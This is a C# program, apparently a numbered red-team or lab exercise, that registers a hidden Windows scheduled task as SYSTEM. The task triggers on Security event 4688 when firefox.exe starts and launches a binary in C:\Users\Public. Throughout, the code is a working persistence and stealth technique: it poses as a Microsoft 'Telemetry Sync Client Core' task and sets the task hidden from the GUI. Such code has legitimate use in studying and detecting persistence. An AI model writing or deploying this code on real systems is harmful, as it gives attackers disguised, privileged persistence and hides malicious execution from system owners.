using System;
using System.Runtime.InteropServices;

namespace A06_3b_event_trigger_schtask_persist
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                #pragma warning disable CA1416
                // 1. Get the Type for the TaskScheduler COM object
                Type? taskSchedulerType = Type.GetTypeFromProgID("Schedule.Service");
                #pragma warning restore CA1416
                if (taskSchedulerType == null)
                {
                    Console.WriteLine("[-] Could not find Schedule.Service COM object.");
                    return;
                }

                // 2. Instantiate the Task Service and connect
                dynamic? ts = Activator.CreateInstance(taskSchedulerType);
                if (ts == null)
                {
                    Console.WriteLine("[-] Could not instantiate TaskScheduler instance.");
                    return;
                }
                ts.Connect();

                // 3. Get the Root Folder
                dynamic rootFolder = ts.GetFolder("\\");

                try
                {
                    // Clean up any previous instances of this task
                    rootFolder.DeleteTask("A06_3b_EventTriggerTask", 0);
                }
                catch (COMException) { /* Task didn't exist, ignore */ }

                // 4. Create a new Task Definition
                dynamic taskDef = ts.NewTask(0);

                // 5. Configure Registration Info
                dynamic regInfo = taskDef.RegistrationInfo;
                regInfo.Author = "Microsoft Windows";
                regInfo.Description = "Telemetry Sync Client Core";

                // 6. Set up the Event Trigger via Advanced XPath Filtering
                dynamic triggers = taskDef.Triggers;
                dynamic trigger = triggers.Create(0); // TASK_TRIGGER_EVENT = 0

                // XPath Subscription: Selects Sysmon Event ID 1 where the Data field 'Image' contains 'firefox.exe'
                // XPath Subscription: Selects Security Event ID 4688 where the Process Name contains 'firefox.exe'
                string subscriptionXml =
                    "<QueryList>" +
                    "  <Query Id='0' Path='Security'>" +
                    "    <Select Path='Security'>" +
                    "        *[System[EventID=4688]] and *[EventData[Data[@Name='NewProcessName'] and (contains(., '\\firefox.exe'))]]" +
                    "    </Select>" +
                    "  </Query>" +
                    "</QueryList>";

                trigger.Id = "FirefoxLaunchTrigger";
                trigger.Subscription = subscriptionXml;
                trigger.Enabled = true;

                // 7. Define the Action (What to execute)
                dynamic actions = taskDef.Actions;
                dynamic action = actions.Create(0); // TASK_ACTION_EXEC = 0

                // Route this to your A06_3b specific logging payload binary
                action.Path = @"C:\Users\Public\A06_3b_SampleApp.exe";

                // 8. Configure Settings (Stealth configuration)
                dynamic settings = taskDef.Settings;
                settings.DisallowStartIfOnBatteries = false;
                settings.StopIfGoingOnBatteries = false;
                settings.Hidden = true; // Hides task from basic GUI listings

                // 9. Register the Task as SYSTEM
                dynamic registeredTask = rootFolder.RegisterTaskDefinition(
                    "A06_3b_EventTriggerTask",  // Task Name
                    taskDef,                       // Task Definition
                    6,                             // TASK_CREATE_OR_UPDATE
                    "SYSTEM",                      // Run as SYSTEM context
                    Type.Missing,
                    5,                             // TASK_LOGON_SERVICE_ACCOUNT
                    Type.Missing
                );

                Console.WriteLine("[+] Successfully registered C# application-triggered stealth task!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error registering task: {ex.Message}");
            }
        }
    }
}